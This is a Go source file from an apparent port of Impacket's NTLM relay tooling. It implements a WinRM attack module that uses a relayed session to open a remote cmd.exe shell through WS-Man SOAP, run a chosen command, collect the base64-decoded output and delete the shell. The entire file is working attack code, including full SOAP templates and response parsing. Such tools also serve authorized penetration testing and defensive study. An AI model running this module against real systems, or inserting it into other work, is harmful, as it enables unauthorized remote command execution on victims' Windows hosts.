package relay

import (
	"encoding/base64"
	"fmt"
	"log"
	"regexp"
	"strings"

	"gopacket/internal/build"
)

// WinRMExecAttack implements AttackModule for WinRM command execution.
// Creates a cmd.exe shell via WS-Man SOAP, executes the command, retrieves output.
// Matches Impacket's winrmattack.py behavior.
type WinRMExecAttack struct{}

func (a *WinRMExecAttack) Name() string { return "winrmexec" }

func (a *WinRMExecAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*WinRMRelayClient)
	if !ok {
		return fmt.Errorf("winrmexec attack requires WinRM session (got %T)", session)
	}

	command := config.Command
	if command == "" {
		command = "whoami"
	}

	toAddr := client.baseURL() + "/wsman"

	// Step 1: Create shell
	log.Printf("[*] Creating WinRM shell on %s...", client.targetAddr)
	shellResp, err := client.DoWinRMRequest(shellCreateXML(toAddr))
	if err != nil {
		return fmt.Errorf("create shell: %v", err)
	}

	shellID := extractShellID(shellResp)
	if shellID == "" {
		if build.Debug {
			log.Printf("[D] WinRM shell create response: %s", shellResp)
		}
		return fmt.Errorf("failed to extract ShellId from response")
	}
	log.Printf("[*] Shell created: %s", shellID)

	// Step 2: Execute command
	if build.Debug {
		log.Printf("[D] WinRM: executing command: %s", command)
	}
	cmdResp, err := client.DoWinRMRequest(executeCommandXML(toAddr, shellID, command))
	if err != nil {
		deleteShell(client, toAddr, shellID)
		return fmt.Errorf("execute command: %v", err)
	}

	commandID := extractCommandID(cmdResp)
	if commandID == "" {
		if build.Debug {
			log.Printf("[D] WinRM execute response: %s", cmdResp)
		}
		deleteShell(client, toAddr, shellID)
		return fmt.Errorf("failed to extract CommandId from response")
	}

	// Step 3: Receive output
	outResp, err := client.DoWinRMRequest(receiveOutputXML(toAddr, shellID, commandID))
	if err != nil {
		deleteShell(client, toAddr, shellID)
		return fmt.Errorf("receive output: %v", err)
	}

	output := decodeOutputStream(outResp)
	if output != "" {
		log.Printf("[+] Command output:\n%s", output)
	} else {
		log.Printf("[*] Command executed (no output)")
	}

	// Step 4: Delete shell
	deleteShell(client, toAddr, shellID)

	return nil
}

// deleteShell sends the Delete SOAP request to clean up the shell.
func deleteShell(client *WinRMRelayClient, toAddr, shellID string) {
	_, err := client.DoWinRMRequest(deleteShellXML(toAddr, shellID))
	if err != nil {
		if build.Debug {
			log.Printf("[D] WinRM: failed to delete shell: %v", err)
		}
	}
}

// --- SOAP XML Templates (match Impacket's winrmattack.py exactly) ---

// shellCreateXML returns the WS-Man SOAP envelope for creating a cmd.exe shell.
// Action: http://schemas.xmlsoap.org/ws/2004/09/transfer/Create
func shellCreateXML(toAddr string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <env:Header>
    <a:To>%s</a:To>
    <a:ReplyTo>
      <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:MessageID>uuid:2a8ac24f-00f0-4a87-860c-bf58d33a1e0a</a:MessageID>
    <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
    <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:OperationTimeout>PT20S</w:OperationTimeout>
    <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>
    <w:OptionSet>
      <w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>
      <w:Option Name="WINRS_CODEPAGE">437</w:Option>
    </w:OptionSet>
    <w:Locale xml:lang="en-US"/>
    <p:DataLocale xml:lang="en-US"/>
  </env:Header>
  <env:Body>
    <rsp:Shell>
      <rsp:InputStreams>stdin</rsp:InputStreams>
      <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
    </rsp:Shell>
  </env:Body>
</env:Envelope>`, toAddr)
}

// keepAliveXML returns the WS-Man heartbeat SOAP envelope (same as shell create).
// Matches Impacket's keepAlive() which uses the shell create XML.
func keepAliveXML(toAddr string) string {
	return shellCreateXML(toAddr)
}

// executeCommandXML returns the WS-Man SOAP envelope for executing a command.
// Action: http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command
func executeCommandXML(toAddr, shellID, command string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <env:Header>
    <a:To>%s</a:To>
    <a:ReplyTo>
      <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
    <a:MessageID>uuid:10000000-0000-0000-0000-000000000002</a:MessageID>
    <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet>
      <w:Selector Name="ShellId">%s</w:Selector>
    </w:SelectorSet>
  </env:Header>
  <env:Body>
    <rsp:CommandLine>
      <rsp:Command>%s</rsp:Command>
    </rsp:CommandLine>
  </env:Body>
</env:Envelope>`, toAddr, shellID, xmlEscape(command))
}

// receiveOutputXML returns the WS-Man SOAP envelope for receiving command output.
// Action: http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive
func receiveOutputXML(toAddr, shellID, commandID string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <env:Header>
    <a:To>%s</a:To>
    <a:ReplyTo>
      <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
    <a:MessageID>uuid:2a8ac24f-00f0-4a87-860c-bf58d33a1e0a</a:MessageID>
    <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet>
      <w:Selector Name="ShellId">%s</w:Selector>
    </w:SelectorSet>
  </env:Header>
  <env:Body>
    <rsp:Receive>
      <rsp:DesiredStream CommandId="%s">stdout stderr</rsp:DesiredStream>
    </rsp:Receive>
  </env:Body>
</env:Envelope>`, toAddr, shellID, commandID)
}

// deleteShellXML returns the WS-Man SOAP envelope for deleting a shell.
// Action: http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete
func deleteShellXML(toAddr, shellID string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
  <env:Header>
    <a:To>%s</a:To>
    <a:ReplyTo>
      <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>
    <a:MessageID>uuid:10000000-0000-0000-0000-000000000004</a:MessageID>
    <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet>
      <w:Selector Name="ShellId">%s</w:Selector>
    </w:SelectorSet>
  </env:Header>
  <env:Body/>
</env:Envelope>`, toAddr, shellID)
}

// --- Response parsing (regex, matching Impacket) ---

var (
	shellIDRegex   = regexp.MustCompile(`<w:Selector\s+Name="ShellId">(.*?)</w:Selector>`)
	commandIDRegex = regexp.MustCompile(`<rsp:CommandId>(.*?)</rsp:CommandId>`)
	stdoutRegex    = regexp.MustCompile(`<rsp:Stream Name="stdout"[^>]*>(.*?)</rsp:Stream>`)
)

// extractShellID parses the ShellId from a shell Create response.
func extractShellID(resp string) string {
	m := shellIDRegex.FindStringSubmatch(resp)
	if len(m) >= 2 {
		return m[1]
	}
	return ""
}

// extractCommandID parses the CommandId from a Command response.
func extractCommandID(resp string) string {
	m := commandIDRegex.FindStringSubmatch(resp)
	if len(m) >= 2 {
		return m[1]
	}
	return ""
}

// decodeOutputStream extracts and decodes base64 stdout streams from a Receive response.
func decodeOutputStream(resp string) string {
	matches := stdoutRegex.FindAllStringSubmatch(resp, -1)
	if len(matches) == 0 {
		return ""
	}

	var sb strings.Builder
	for _, m := range matches {
		if len(m) >= 2 && m[1] != "" {
			decoded, err := base64.StdEncoding.DecodeString(m[1])
			if err != nil {
				continue
			}
			sb.Write(decoded)
		}
	}
	return sb.String()
}

// xmlEscape escapes special XML characters in a string.
func xmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&apos;")
	return s
}
